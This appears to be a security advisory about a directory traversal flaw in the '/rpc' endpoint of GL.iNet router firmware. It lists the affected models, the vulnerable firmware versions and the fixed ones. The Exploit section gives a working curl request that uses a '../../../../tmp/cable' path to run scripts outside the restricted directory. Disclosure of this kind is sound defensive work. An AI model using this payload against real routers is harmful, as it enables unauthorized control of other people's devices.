# Improper Pathname Restriction Leading to Path Traversal in Restricted Directories
## Description
The second item of the "params" parameter in the "call" method of the "/rpc" endpoint is vulnerable to directory traversal, allowing attackers to execute scripts at arbitrary paths.
## Affected Product
● MT6000 /MT3000 /MT2500 /AXT1800 /AX1800 /B3000 /A1300 /X300B /X3000 /XE3000 /X750 /SFT1200 /MT1300 /E750 /XE300 /AR750 /AR750S /AR300M /AR300M16 /B1300 /MT300N-V2
## Affected Firmware Version
● MT6000/MT3000/MT2500/AXT1800/AX1800: 4.6.2, fixed in 4.6.4
● B3000: 4.5.18, fixed in 4.5.19
● A1300/X300B: 4.5.17, fixed in 4.5.18
● X3000/XE3000: 4.4.9, fixed in 4.4.10
● X750/SFT1200/MT1300: 4.3.18, fixed in 4.3.19
● E750/XE300/AR750/AR750S/AR300M/AR300M16/B1300/MT300N-V2: 4.3.17, fixed in 4.3.18
## Exploit
Executing APIs in files through directory traversal.
Example: 
```
  cp /usr/lib/oui-httpd/rpc/cable /tmp/

  curl -H 'glinet:1' 127.0.0.1/rpc -d '{"method":"call","params":["","../../../../tmp/cable", "get_status"]}'
```
## Impact
An attacker can execute scripts through directory traversal to gain control over the router.
